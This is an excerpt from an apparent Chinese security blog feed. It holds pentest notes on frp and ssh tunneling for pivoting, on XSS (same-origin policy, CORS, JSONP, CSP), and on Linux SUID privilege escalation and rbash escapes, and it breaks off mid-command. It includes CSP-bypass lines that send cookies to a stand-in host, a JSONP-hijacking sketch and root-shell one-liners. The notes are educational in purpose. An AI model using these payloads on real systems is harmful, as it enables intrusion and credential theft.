    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;jdk7u21 链，是一个不需要借助第三方库就能实现的链。影响版本&amp;lt;=7u21&lt;/p&gt;
&lt;h1 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分</summary>
      
    
    
    
    
    <category term="java开发与安全" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>代理总结</title>
    <link href="http://const27.com/2021/03/24/%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/"/>
    <id>http://const27.com/2021/03/24/%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-23T16:50:57.356Z</published>
    <updated>2021-03-11T05:46:20.645Z</updated>
    
    <content type="html"><![CDATA[<h1 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h1><p>frp，确实蛮好用的，他基本不会被杀软杀掉。而且无论是win到win，linux到linux还是win到linux的转发，它都支持。 Download；<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><p>frp分为有两个主要可执行文件，frps和frpc，对应的配置文件为frps.ini和frpc.ini。</p><p>其中frps用作服务端，在进行渗透的时候一般架设在公网VPS上，它的配置文件默认为这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 10067  #监听的端口</span><br><span class="line"></span><br><span class="line">运行 frps -c frps.ini</span><br></pre></td></tr></table></figure><p>frpc用作客户端，在进行渗透的时候一般假设在内网机器上，它的默认文件一般长这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 149.17.4.190 # 指定需要转发到的公网IP</span><br><span class="line">server_port &#x3D; 10067 # 公网VPS上所监听的端口</span><br><span class="line"></span><br><span class="line">[socks_proxy] # 标签名，任意</span><br><span class="line">type &#x3D; tcp #设置转发的协议</span><br><span class="line">local_ip&#x3D;127.0.0.1 #填127.0.0.1就完事了</span><br><span class="line">local_port&#x3D;3389 #需要被转发的端口</span><br><span class="line">remote_port&#x3D;10068 #转发到VPS上的端口</span><br><span class="line"></span><br><span class="line">运行 frpc -c frpc.ini</span><br></pre></td></tr></table></figure><p>当我们在VPS上运行frps，内网机器运行frpc后，内网机器的3389端口就会被转发到公网的10068端口上，接下来我们远程链接 149.17.4.190:10068 即可连进内网机器的远程桌面了。</p><p>上面是端口映射，下面是直接走socks5代理</p><p>服务端:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr &#x3D; 0.0.0.0</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line"> </span><br><span class="line"># 用户密码保平安</span><br><span class="line">dashboard_user &#x3D; admin1</span><br><span class="line">dashboard_pwd &#x3D; hadaessd@@@!!@@#</span><br><span class="line"># 允许客户端绑定的端口</span><br><span class="line">allow_ports &#x3D; 40000-50000</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">#remote vps addr</span><br><span class="line">server_addr &#x3D; your vps addr</span><br><span class="line">#端口自选</span><br><span class="line">server_port &#x3D; 7000   </span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line">pool_count &#x3D; 5</span><br><span class="line"> </span><br><span class="line">[plugin_socks]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 46075</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">plugin_user &#x3D; admin</span><br><span class="line">plugin_passwd &#x3D; hahha@@###</span><br><span class="line">use_encryption &#x3D; true</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure><h1 id="ssh代理"><a href="#ssh代理" class="headerlink" title="ssh代理"></a>ssh代理</h1><p>在本机上执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -N -f -D 本地端口 用户名@远程服务器ip</span><br></pre></td></tr></table></figure><p>然后输入远程服务器上指定的用户名的密码，就可以通过指定的本地端口代入远程服务器内网了~</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309004816359.png" alt="image-20210309004816359"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309004828174.png" alt="image-20210309004828174"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;frp&quot;&gt;&lt;a href=&quot;#frp&quot; class=&quot;headerlink&quot; title=&quot;frp&quot;&gt;&lt;/a&gt;frp&lt;/h1&gt;&lt;p&gt;frp，确实蛮好用的，他基本不会被杀软杀掉。而且无论是win到win，linux到linux还是win到linux的转发，它都支持。</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>重温XSS</title>
    <link href="http://const27.com/2021/03/24/%E9%87%8D%E6%B8%A9XSS/"/>
    <id>http://const27.com/2021/03/24/%E9%87%8D%E6%B8%A9XSS/</id>
    <published>2021-03-23T16:50:01.823Z</published>
    <updated>2021-03-23T17:12:02.190Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="同源策略与跨域"><a href="#同源策略与跨域" class="headerlink" title="同源策略与跨域"></a>同源策略与跨域</h1><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><h3 id="同源的定义"><a href="#同源的定义" class="headerlink" title="同源的定义"></a>同源的定义</h3><p>若两个URL 协议，端口，host都相同，则这两个URL同源。<br>这个方案叫做“协议/主机/端口元组”，或者直接是 “元组”</p><p>同源策略又分为DOM同源策略(禁止对不同源的页面的DOM进行操作)和XMLHttpRequest(禁止XHR对象项不同源的服务器地址发起HTTP请求)同源策略</p><h3 id="同源策略的作用"><a href="#同源策略的作用" class="headerlink" title="同源策略的作用"></a>同源策略的作用</h3><p>限制一个JS脚本对不同源的URL进行操作。</p><p>这么说可能会有点抽象，那不如看看下面的例子:</p><p>1.如果没有DOM同源策略，就意味着一个页面可以对任意页面的DOM进行操作。那么就会导致以下安全问题:<br>做一个假网站，并插入一个占满全页面的iframe指向一个登陆界面如银行登录界面。用户进来后会发现除了域名不同，其他都和正常的银行登陆界面一致。若用户输入了账号密码，那么我们就可以跨域读取到银行登陆界面的dom树，从而读取用户输入的账号密码。</p><p>2.如果没有XMLHttpRequest，就意味着可以一个页面可以向任意页面发起HTTP请求。那么就会导致以下安全问题:<br>当一个用户登陆了某个系统，如银行个人系统，此时银行网站会给用户返回cookie。如果用户此时访问了我们的恶意网站，就会执行我们恶意网站中的恶意AJAX代码，此AJAX代码会向银行网站发起HTTP请求，比如发起查询账户余额的请求（此时会默认附带用户的cookie）。银行页面发现cookie无误，就会返回请求的数据:账户余额，造成数据泄露。</p><h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><p>上面我们说了同源策略中，一个页面不能对不同源的页面进行操作。但是在实际情况中，还是有一些js标签能摆脱这种束缚,如script标签就能通过src属性获取不同源页面上的js代码，iframe能嵌入不同源站点的资源等等。<br>这样的标签有如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;...&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;...&quot;&gt;</span><br><span class="line">&lt;img&gt; &#x2F; &lt;video&gt; &#x2F; &lt;audio&gt;</span><br><span class="line">&lt;object&gt; &lt;embed&gt; 和 &lt;applet&gt; 的插件</span><br><span class="line">@font-face</span><br><span class="line">&lt;frame&gt; 和 &lt;iframe&gt;</span><br></pre></td></tr></table></figure><p>但仅仅是这样，有些时候还是无法达到业务的需求，我们有时需要突破这种限制来达到业务需求，也就是避开同源策略，以下是几种解决方案。</p><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>CORS，即跨域资源共享，它是一个W3C标准，定义了必须访问跨域资源时，浏览器和服务器该如何协商。<br>其实质就是以AJAX为载体，使用自定义HTTP头让浏览器与服务器进行协商，从而决定跨域请求是否应该成功。<br>所以实现CORS通信的关键是服务器是否实现了CORS接口。</p><p>另外，并不是所有浏览器都支持CORS，比如IE6,IE7,Opera min 不支持CORS。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>浏览器把CORS的请求分成两类:简单请求与非简单请求</p><p>简单请求:<br>满足以下条件，即为简单请求</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">请求方法是以下三种方法之一：</span><br><span class="line">HEAD</span><br><span class="line">GET</span><br><span class="line">POST</span><br><span class="line"></span><br><span class="line">且HTTP的头信息不超出以下几种字段：</span><br><span class="line">Accept</span><br><span class="line">Accept-Language</span><br><span class="line">Content-Language</span><br><span class="line">Last-Event-ID</span><br><span class="line">Content-Type：只限于三个值 application&#x2F;x-www-form-urlencoded、multipart&#x2F;form-data、text&#x2F;plain</span><br></pre></td></tr></table></figure><p>只要不满足以上条件，都为非简单请求。</p><p>对于简单请求，其实现原理如下:</p><p>1.在请求头中加一个额外头:Origin, 其包含发出请求的页面的协议，域名，端口，服务器以此来判断是否给予响应。<br>2.服务器收到请求后，判别该Origin指向的站点能否跨域。若能跨域，就在 Access-Control-Allow-Origin 头部中回发相同的源信息（如果是公共资源，可以回发 * ）；若不能跨域，则没有这个头部或者源信息不匹配（即Access-Control-Allow-Origin内容非*且与Origin不符）<br>3.同时如果服务器返回的头中有 Access-Control-Allow-Credentials: true ，则说明可以跨域向服务器发送带有cookie的HTTP请求。</p><p>对于非简单请求，它会实现进行预检，其原理如下:<br>1.进行预检，以OPTIONS方法向服务器发送Origin头部，Access-Control-Request-Method头部（接下来的请求方法，如POST），Access-Control-Request-Headers（自定义头部信息，可选）<br>2.服务器响应，有如下头:Access-Control-Allow-Origin,Access-Control-Allow-Methods(允许的请求方法)，Access-Control-Allow-Headers（允许的自定义头部信息），Access-Control-Max-Age（应该将预检请求缓存多长时间，以秒为单位）<br>3.通过预检请求后，以后每次浏览器的CORS请求都会和简单请求一样。</p><h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>我们不妨通过一个例子来窥视JSONP的实现原理。</p><p>我们有如下文件test.html</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;&lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;HI&lt;&#x2F;h1&gt;</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            var fun1&#x3D;function(data)&#123;</span><br><span class="line">                alert(data)</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;&#x2F;script&gt;</span><br><span class="line">        &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;http:&#x2F;&#x2F;192.168.111.1&#x2F;a.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>其包含的a.js如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fun1(&quot;remote data&quot;);</span><br></pre></td></tr></table></figure><p>访问test.html，成功触发弹窗，我们将test.html中的fun1函数称为回调函数</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210322211050387.png" alt="image-20210322211050387"></p><p>于是就出现了利用这种原理来实现跨域传输数据的方法：JSONP</p><p>下面说说JSONP的具体实现流程:</p><p>客户端:<br>1.定义获取数据后的回调函数<br>2.动态生成服务端JS进行引用的代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">关于此处第2点，我们可以说道说道。</span><br><span class="line">我们再用这个方法实现跨域时，怎么让远程JS知道我们本地的回调函数叫什么名字？</span><br><span class="line">这就需要通过一些手段动态生成服务端的JS代码了。</span><br><span class="line">比如我们可以通过get参数来控制其返回的本地回调函数名，如: http:&#x2F;&#x2F;a.com?callback&#x3D;fun1</span><br></pre></td></tr></table></figure><p>服务端:<br>返回由回调函数名包裹的JSON数据，如</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fun1(&#123;</span><br><span class="line">&quot;key1&quot;:&quot;value1&quot;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这里为什么要特别强调是JSON呢？因为JSON不仅可以简洁的表述复杂的数据，而且JS原生支持JSON，可以在客户端自由处理JSON数据，所以服务端多传回JSON数据，JSONP这个名字也是这么来的。</p><h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><p>CSP，即内容安全策略。它通过白名单策略，告诉客户端哪些外部资源可以加载和执行。<br>同时需要注意的是，CSP目前有1.0 2.0 3.0 版本，每个版本的规则都有不同</p><h2 id="CSP规则"><a href="#CSP规则" class="headerlink" title="CSP规则"></a>CSP规则</h2><p>CSP通过定义一系列规则来实现安全管理。</p><p>首先我们来看看一条CSP规则的范例</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: default-src https:&#x2F;&#x2F;host1.com https:&#x2F;&#x2F;host2.com; frame-src &#39;none&#39;; object-src &#39;none&#39;</span><br><span class="line">多个CSP指令间用分号隔开，多个指令值之间用空格隔开</span><br></pre></td></tr></table></figure><p>下面是各个指令及其指令值的效果</p><p>摘自<a href="https://blog.csdn.net/qq_37943295/article/details/79978761">https://blog.csdn.net/qq_37943295/article/details/79978761</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210322214229302.png" alt="image-20210322214229302"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210322214238476.png" alt="image-20210322214238476"></p><h2 id="启用CSP"><a href="#启用CSP" class="headerlink" title="启用CSP"></a>启用CSP</h2><p>那么如何启用CSP呢？有两种方式</p><p>1.在HTTP头添加<br>在HTTP头响应添加content-security-policy头并写入CSP规则以后，就能启用CSP了</p><p>图引用于<a href="http://www.ruanyifeng.com/blog/2016/09/csp.html">http://www.ruanyifeng.com/blog/2016/09/csp.html</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210322214736472.png" alt="image-20210322214736472"></p><p>2.在meta标签里添加<br>向内添加如下内容</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;</span><br><span class="line">即可</span><br></pre></td></tr></table></figure><h1 id="一些其他XSS保护机制"><a href="#一些其他XSS保护机制" class="headerlink" title="一些其他XSS保护机制"></a>一些其他XSS保护机制</h1><h2 id="X-Frame"><a href="#X-Frame" class="headerlink" title="X-Frame"></a>X-Frame</h2><p>X-Frame-Options 是一个响应头，指定此页面能否在&lt;frame&gt;或者&lt;iframe&gt;中插入.<br>他有三个可选值:</p><ul><li><p>DENY</p><p>页面不能被嵌入到任何iframe或frame中</p></li><li><p>SAMEORIGIN</p><p>页面只能被本站页面嵌入到iframe或者frame中</p></li><li><p>ALLOW-FROM uri</p><p>表示该页面可以在指定来源的 frame 中展示。</p></li></ul><h2 id="XSS-auditor"><a href="#XSS-auditor" class="headerlink" title="XSS auditor"></a>XSS auditor</h2><h2 id="httponly"><a href="#httponly" class="headerlink" title="httponly"></a>httponly</h2><p>httponly 是一个针对cookie的保护机制。<br>其实现原理是在response中对某一项cookie设置为HTTPONLY=true，从而使该cookie不能被document.cookie 读取。</p><p>我们随便找个网站，发现其captch_session_v2开启了httponly</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210323115121425.png" alt="image-20210323115121425"></p><p>随后我们通过document.cookie尝试去读取aptch_session_v2的值，发现其值并没有出现在返回内容中<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210323115228944.png" alt="image-20210323115228944"></p><h2 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a>htmlspecialchars</h2><p>htmlspecialchars是一个php函数，它可以将一些敏感字符转义</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp; (AND) &#x3D;&gt; &amp;</span><br><span class="line">&quot; (双引号) &#x3D;&gt; &quot; (当ENT_NOQUOTES没有设置的时候) </span><br><span class="line">&#39; (单引号) &#x3D;&gt; &amp;#039; (当ENT_QUOTES设置) </span><br><span class="line">&lt; (小于号) &#x3D;&gt; &lt; </span><br><span class="line">&gt; (大于号) &#x3D;&gt; &gt; </span><br></pre></td></tr></table></figure><h1 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h1><h2 id="bypass-csp"><a href="#bypass-csp" class="headerlink" title="bypass csp"></a>bypass csp</h2><p>csp，是可以被bypass的。我们接下来就想办法bypass csp来回传cookie</p><p>1</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">default-src &#39;none&#39;;</span><br></pre></td></tr></table></figure><p>可以通过meta标签实现重定向</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;1;url&#x3D;http:&#x2F;&#x2F;www.xxx.com&#x2F;x.php?cookie&#x3D;[cookie]&quot;&gt;</span><br></pre></td></tr></table></figure><p>即，1秒后跳转至指定url</p><p>2</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">script-src ‘self’ ‘unsafe-inline’</span><br></pre></td></tr></table></figure><p>开放了内联脚本。我们可以通过window.location,windows.open或者meta标签实现页面跳转。也可以通过动态创建元素实现跳转</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var a &#x3D; document.createElement(&quot;a&quot;);</span><br><span class="line">a.href&#x3D;&#39;http:&#x2F;&#x2F;www.baidu.com&#39;+document.cookie;</span><br><span class="line">a.click();</span><br></pre></td></tr></table></figure><p>3</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">default-src &#39;self&#39;; script-src &#39;self&#39;</span><br></pre></td></tr></table></figure><p>限制了只能加载本域JS脚本，同时禁止了内联脚本执行。<br>不过问题不大，如果我们有一个上传点，我们可以上传一个恶意JS文件，上传后如果我们知道此JS文件上传位置与文件名且上传的位置是本域，然后通过XSS实现加载此恶意JS文件。</p><p>另外在CSP1.0版本中，还可以通过以下方式进行跳转(现在不咋好用了)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;prefetch&quot; href&#x3D;&quot;http:&#x2F;&#x2F;xxx.cn&quot;&gt; (H5预加载)</span><br><span class="line">&lt;link rel&#x3D;&quot;dns-prefetch&quot; href&#x3D;&quot;http:&#x2F;&#x2F;xxx.cn&quot;&gt; （DNS预加载）</span><br></pre></td></tr></table></figure><p>4</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">script-src http:&#x2F;&#x2F;www.a.com&#x2F;b&#x2F; </span><br></pre></td></tr></table></figure><p>限制了只能从某特定路径去加载JS脚本<br>对此一般的解决方法是看看此目录下有没有可控重定向的文件，比如这种</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b&#x2F;302.php</span><br><span class="line">&lt;?php Header(&quot;location: &quot;.$_GET[&#39;url&#39;])?&gt;</span><br></pre></td></tr></table></figure><p>我们就可以插入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;b&#x2F;302.php?url&#x3D;http:&#x2F;&#x2F;a.com&#x2F;upload&#x2F;a.js&quot;&gt;  </span><br><span class="line">    </span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>去加载我们上传的JS脚本（上传点自己找）</p><h2 id="JSONP-劫持"><a href="#JSONP-劫持" class="headerlink" title="JSONP 劫持"></a>JSONP 劫持</h2><p>简单说一说</p><p>首先存在网站B，它包含登录用户的ID,passwd等敏感信息。且有页面<a href="http://b.com/user?callback=">http://B.com/user?callback=</a>  用来进行JSONP跨域数据传输ID,PASSWD等信息，这是前提。<br>用户登录B后，打开了我们的恶意网站A.com,A.com的内容为:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;http:&#x2F;&#x2F;B.com&#x2F;user?jsonp&#x3D;Callback&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">function Callback(result)</span><br><span class="line">&#123;</span><br><span class="line">    将获取内容上传至恶意服务器的JS代码.....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么A网站就会向网站B跨域请求到敏感信息，并上传到恶意服务器保存。<br>这就是JSONP劫持，此方法常用于水坑攻击</p><h2 id="常用触发点与bypass"><a href="#常用触发点与bypass" class="headerlink" title="常用触发点与bypass"></a>常用触发点与bypass</h2><p><a href="https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html">https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h1 id=&quot;同源策略与跨域&quot;&gt;&lt;a href=&quot;#同源策略与跨域&quot; class=&quot;headerlink&quot; title=&quot;同源策略与跨域&quot;&gt;&lt;/a&gt;同源策略与跨</summary>
      
    
    
    
    
    <category term="外围打点" scheme="http://const27.com/tags/%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>Linux 提权总结</title>
    <link href="http://const27.com/2021/03/12/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
    <id>http://const27.com/2021/03/12/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-12T06:33:21.708Z</published>
    <updated>2021-03-16T13:36:09.073Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sudo-和-suid-提权"><a href="#sudo-和-suid-提权" class="headerlink" title="sudo 和 suid 提权"></a>sudo 和 suid 提权</h1><h2 id="何为suid"><a href="#何为suid" class="headerlink" title="何为suid"></a>何为suid</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145316.png" alt="QQ截图20210217145316"></p><p>可见在权限位置有一个s权限。那么这个s的作用是什么呢？<br>答案是当其他用户执行该文件时，该文件会以root的身份执行。<br>这里就涉及到了Effective UID和Real UID以及Saved UID<br>Effective UID: 程序实际操作时生效的UID<br>Real UID: 执行该程序的用户的实际UID<br>Saved UID: 在高权限用户降权后，保留的其原本UID (不展开说)</p><p>所以增加了一个s权限，该程序在实际运行时Effective UID就会变为0，即root的UID</p><h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h2><p>就是能把一个命令视作root来执行,用sudo-l查看可以被sudo的命令</p><h2 id="SUID与sudo提权"><a href="#SUID与sudo提权" class="headerlink" title="SUID与sudo提权"></a>SUID与sudo提权</h2><h3 id="遍历目录中的suid文件"><a href="#遍历目录中的suid文件" class="headerlink" title="遍历目录中的suid文件"></a>遍历目录中的suid文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p>执行该命令，会得到所有suid文件</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145327.png" alt="QQ截图20210217145327"></p><h3 id="用sudo-l-查看哪些命令能被sudo"><a href="#用sudo-l-查看哪些命令能被sudo" class="headerlink" title="用sudo -l 查看哪些命令能被sudo"></a>用sudo -l 查看哪些命令能被sudo</h3><h3 id="可利用于提权的命令"><a href="#可利用于提权的命令" class="headerlink" title="可利用于提权的命令"></a>可利用于提权的命令</h3><h5 id="1-nmap"><a href="#1-nmap" class="headerlink" title="1.nmap"></a>1.nmap</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure><p>使用nmap的udp或tcp syn扫描时，需要用到root权限，所以有些管理员图方便会直接给namp上s权限，而nmap 5.20(使用nmap -v查看nmap版本)之前有一个interactive交互模式(nmap –interactive)，在nmap effective uid为0时，可以通过这个模式获得root权限交互式命令行，成功提权</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;os.execute(&#39;&#x2F;bin&#x2F;bash&#39;)&quot; &gt; .&#x2F;shell</span><br><span class="line">nmap --script&#x3D;shell</span><br></pre></td></tr></table></figure><p>全版本通杀提权，利用nmap可以执行指定文件的特点提权</p><h5 id="2-find"><a href="#2-find" class="headerlink" title="2.find"></a>2.find</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -exec command</span><br></pre></td></tr></table></figure><p>find命令自带-exec参数，可以执行命令，若find有suid权限，那么使用exec相当于直接提权到root.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">读文件 find &#x2F;path -exec &#123;&#125; \;</span><br></pre></td></tr></table></figure><h5 id="3-vim"><a href="#3-vim" class="headerlink" title="3.vim"></a>3.vim</h5><p>vim有了suid就可以任意文件读取了</p><p>同时也可以输入 :shell</p><p>来获取root shell</p><h5 id="4-bash"><a href="#4-bash" class="headerlink" title="4.bash"></a>4.bash</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -p  开启一个新shell，suid的话自然是开启root shell</span><br></pre></td></tr></table></figure><h5 id="5-less，more"><a href="#5-less，more" class="headerlink" title="5.less，more"></a>5.less，more</h5><p>和vim差不多，任意文件读取，同时也可以输入 !command 进行提权到root</p><h5 id="6-exim"><a href="#6-exim" class="headerlink" title="6.exim"></a>6.exim</h5><p>exim在特定版本下会有suid提权</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145341.png" alt="QQ截图20210217145341"></p><p>下载exp打就完事了</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="rbash-绕过"><a href="#rbash-绕过" class="headerlink" title="rbash 绕过"></a>rbash 绕过</h1><h2 id="何为rbash"><a href="#何为rbash" class="headerlink" title="何为rbash"></a>何为rbash</h2><p>rbash，是出于安全性考虑的一个功能受限的bash，我在vulnhub dc-2首次接触,他的限制性可能会有如下.</p><ul><li>cd 切换目录</li><li>含有斜杠 <code>/</code> 的命令, 譬如 <code>/bin/sh</code></li><li>设置 PATH ENV 等环境变量</li><li>使用 <code>&gt;</code> <code>&lt;</code> 进行重定向</li><li>binary 的运行. 通常 root 用户会手动创建 <code>/bin/binary_file -&gt; /home/rbash_user/bin/binary_file</code> 的软链接, 限制性地提供部分 binary_file 给 rbash_user 使用 在 bash 下 <code>echo $SHELL</code>, 可以获取当前环境是否是 rbash.</li></ul><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="scp-bypass"><a href="#scp-bypass" class="headerlink" title="scp bypass"></a>scp bypass</h3><p>我在<a href="http://www.const27.com/2020/07/02/vulnhub-dc-2/%E5%B0%B1%E6%98%AF%E7%94%A8scp%E7%BB%95%E7%9A%84">http://www.const27.com/2020/07/02/vulnhub-dc-2/就是用scp绕的</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145419.png" alt="QQ截图20210217145419"></p><h2 id="进入命令自带shell-bypass"><a href="#进入命令自带shell-bypass" class="headerlink" title="进入命令自带shell bypass"></a>进入命令自带shell bypass</h2><p>man,git config help,more,less,vim,vi,ftp,gdb等命令都有自己的shell，我们只需在他们各自的shell中执行/bin/sh即可<br>一般都是在shell键入!/bin/sh来bypass rbash</p><p>下面这种方法也是可行的（似乎仅vim)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p>执行上面两个语句，就bypass了</p><h2 id="find-bypasss"><a href="#find-bypasss" class="headerlink" title="find bypasss"></a>find bypasss</h2><p>简单概括就是-exec执行一下/bin/bash …</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145437.png" alt="QQ截图20210217145437"></p><h2 id="编程语言-bypass"><a href="#编程语言-bypass" class="headerlink" title="编程语言 bypass"></a>编程语言 bypass</h2><p>python</p><p>如果python都可以用的话，那就更轻松了，os安排一下<br>似乎pty也行?没试</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os;os.system(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br></pre></td></tr></table></figure><p>php</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -a 进入php shell</span><br><span class="line">然后执行命令:exec(&quot;&#x2F;bin&#x2F;bash&quot;);</span><br></pre></td></tr></table></figure><p>perl</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39;</span><br></pre></td></tr></table></figure><p>ruby</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -e &#39;exec 